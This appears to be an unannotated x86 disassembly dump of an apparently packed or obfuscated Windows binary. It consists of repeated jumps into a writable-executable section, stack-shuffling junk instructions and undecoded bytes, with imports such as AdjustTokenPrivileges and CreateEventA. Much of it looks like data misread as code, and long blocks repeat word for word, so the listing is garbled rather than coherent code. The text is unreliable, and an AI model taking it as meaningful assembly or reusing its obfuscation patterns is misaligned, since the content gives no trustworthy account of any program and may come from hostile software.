imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4cfe49
pushfd
mov [ esp + 0x4 ] 0x7e
lea esp [ esp + 0x18 ]
jae rwxdata
jmp rwxdata
call sub_4ba8b4
add [ eax ] al
inc ebx
jb rwxdata
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
outsb
jbe rwxdata
jo rwxdata
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
sti
jb rwxdata
outsb
inc ebp
inc esp
jb rwxdata
pushad
jmp rwxdata
clc
mov bh 0x89
outsb
insd
outsb
je rwxdata
add [ eax ] al
add [ ebp + 0x78 ] al
jo rwxdata
jbe rwxdata
pushfd
jmp rwxdata
add bh bh
cld
cmp al 0x8d
clc
or al 0x66
bt ebx 0x5
je rwxdata
add [ eax ] al
dec ebx
jns __export_name_ptr_table_3(ADVAPI32:AdjustTokenPrivileges)
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
mov [ esp + 0x28 ] rwxdata
push r--data
call sub_515df3
pop esi
dec esp
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl __import_lookup_table_0(KERNEL32:Heap32ListFirst)
pop ebp
jecxz rwxdata
xor al 0x24
add eax ebx
pushad
push [ esp + 0x4 ]
xchg [ esp + 0x28 ] eax
lea eax [ eax - 0x4b79bcf1 ]
mov ax 0x4d34
pop eax
push [ esp + 0x4 ]
lea eax [ 0x0 ]
jmp rwxdata
imul ebp [ esi + 0x67 ] 0xff004173
add [ eax ] al
inc ecx
push 0x75
jae rwxdata
jpe rwxdata
jmp rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge __import_lookup_table_0(KERNEL32:GetSystemTime)
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
jae rwxdata
push esp
outsd
imul esp [ ebp + 0x6e ] 0x50
jb rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
jmp rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
je rwxdata
jb rwxdata
jbe rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js __import_lookup_table_0(KERNEL32:WaitForSingleObject)
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je __import_lookup_table_0(KERNEL32:CreateEventA)
mov ebp 0xad9cea9b
cmpsb [ esi ] [ edi ]
scasd [ edi ]
sbb [ 0xffffffffaca7a8db ] ah
stosd [ edi ]
jae rwxdata
cmp ebx 0x1
call sub_515950
inc esi
imul ebp [ ebp + 0x41 ] 0xcebc100
bt bx 0x5
xchg esi eax
0x92ab6387 0xc8b
outsb
insb
jae sub_4cfe87
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
cmp al bh
mov ebx eax
mov ecx 0xb7f89177
mov [ esi - 0x549c7866 ] edx
xchg edx eax
mov ecx [ ebx * 2 + 0x3cfc90e3 ]
mov edx 0xfb8305e3
add eax ebp
or [ edx + 0x4 ] bl
add bl bh
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
